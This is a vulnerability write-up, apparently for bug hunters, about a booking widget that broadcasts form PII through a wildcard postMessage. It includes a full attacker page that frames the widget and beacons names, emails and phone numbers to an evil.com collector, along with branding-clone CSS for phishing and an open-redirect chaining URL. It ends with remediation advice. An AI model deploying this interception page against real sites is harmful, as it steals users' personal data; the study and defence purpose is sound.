PostMessage PII Leak via Widget Framing

Inspired by renwa's widget security analysis · Affects booking/form widgets with wildcard postMessage

Vulnerability

A booking widget broadcasts form submission data (first name, last name, email, phone number) via postMessage with targetOrigin: "*". The widget page has no X-Frame-Options or frame-ancestors CSP. An attacker can iframe the widget, wait for the user to submit the form, and intercept all PII from any origin.

The Discovery

While analyzing a meetings/booking widget embedded on a bug bounty target, the researcher noticed the widget iframe communicated with its parent page via postMessage. Examining the widget's JavaScript revealed:

// Widget source code (meetings widget)
form.addEventListener('submit', function(e) {
  e.preventDefault();

  var formData = {
    firstName: document.querySelector('[name="firstName"]').value,
    lastName: document.querySelector('[name="lastName"]').value,
    email: document.querySelector('[name="email"]').value,
    phone: document.querySelector('[name="phone"]').value
  };

  // VULNERABLE: broadcasts PII to ANY parent with wildcard origin
  window.parent.postMessage({
    type: 'formSubmission',
    data: formData
  }, '*');  // <-- targetOrigin is "*" !!
});

Two critical issues combine here:

  • Wildcard targetOrigin: postMessage(data, "*") sends to any parent origin
  • No framing protection: Missing X-Frame-Options and no frame-ancestors CSP directive

The Attack

The attacker creates a page that iframes the widget and listens for the postMessage containing PII:

<!-- Attacker's page: https://evil.com/steal-pii.html -->
<style>
  /* Make it look like the legitimate booking page */
  body { font-family: sans-serif; text-align: center; padding: 40px; }
  iframe { width: 100%; height: 600px; border: none; }
</style>

<h2>Book Your Appointment</h2>
<p>Fill out the form below to schedule a meeting.</p>

<!-- Iframe the vulnerable widget -->
<iframe src="https://meetings.target.com/book/team/consultation"
        id="booking-widget"></iframe>

<script>
// Listen for the PII broadcast
window.addEventListener('message', function(event) {
  // The widget sends to "*" so we receive it regardless of our origin

  if (event.data && event.data.type === 'formSubmission') {
    var pii = event.data.data;

    console.log('Stolen PII:', pii);
    // { firstName: "John", lastName: "Doe",
    //   email: "john@company.com", phone: "+1-555-0123" }

    // Exfiltrate to attacker server
    navigator.sendBeacon('https://evil.com/collect',
      JSON.stringify({
        firstName: pii.firstName,
        lastName: pii.lastName,
        email: pii.email,
        phone: pii.phone,
        timestamp: new Date().toISOString()
      })
    );
  }

  // Also intercept "widgetReady" events
  if (event.data && event.data.type === 'widgetReady') {
    console.log('Widget loaded - ready to intercept');
  }
});
</script>

Making It Convincing

The attacker can make the phishing page look identical to the legitimate booking page. The iframe loads the real widget from the real domain, so the form itself is 100% legitimate — SSL certificate, real functionality, real booking confirmation. The victim has no way to know their data is being intercepted:

<style>
  /* Clone the target's branding */
  body {
    background: #f8fafc;
    font-family: -apple-system, sans-serif;
  }
  .header {
    background: #1a365d; /* Target's brand color */
    color: white;
    padding: 20px;
  }
  .header img { height: 40px; }
  .container {
    max-width: 800px;
    margin: 40px auto;
    background: white;
    border-radius: 12px;
    box-shadow: 0 4px 16px rgba(0,0,0,0.08);
    overflow: hidden;
  }
  iframe {
    width: 100%;
    height: 700px;

  }
</style>

<div class="header">
  <img src="https://target.com/logo.png" alt="Target Company">
</div>
<div class="container">
  <iframe src="https://meetings.target.com/book/team/consultation"></iframe>
</div>

<!-- Silent PII interception runs in background -->

Why It Matters

The victim fills out a real form on a real domain. The booking actually works. They get a real confirmation. But all their PII (name, email, phone) is silently copied to the attacker. This is more effective than traditional phishing because nothing is fake — the SSL certificate, the domain, the functionality are all legitimate. The only "fake" part is the parent page, which the user might not even notice.

Variations and Escalation

Intercepting Multiple Events

Widgets often broadcast many events beyond form submission:

// Events observed via postMessage monitoring:
{ type: "widgetReady" }                    // Widget loaded
{ type: "pageView", page: "/booking" }     // Navigation tracking
{ type: "formSubmission", data: {...} }    // PII!
{ type: "bookingConfirmed", meetingId: "..." }  // Meeting details
{ type: "calendarSelected", date: "..." }  // User's availability

Chaining with Open Redirect

If the widget page has an open redirect, use it to enhance the phishing:

// Send victim through target's own domain first
https://target.com/redirect?url=https://evil.com/booking-page
// Victim sees "target.com" briefly, building trust

Bug Bounty Tip

When auditing widgets/iframes: (1) Check X-Frame-Options and CSP frame-ancestors — if missing, the page is frameable. (2) Monitor postMessage traffic with window.addEventListener('message', e => console.log(e.origin, e.data)). (3) Check targetOrigin in the source — search for postMessage( and look at the second argument. If it's "*", any parent can receive the data. (4) Look at what data is broadcast — PII, auth tokens, internal IDs. The severity depends on the data sensitivity.

Remediation

  • Replace targetOrigin: "*" with the specific parent origin the widget expects
  • Add X-Frame-Options: SAMEORIGIN or CSP frame-ancestors 'self' trusted-parent.com
  • Validate the parent origin before sending sensitive data via postMessage
  • Don't broadcast raw PII via postMessage — send only event identifiers and let the parent fetch data via authenticated API
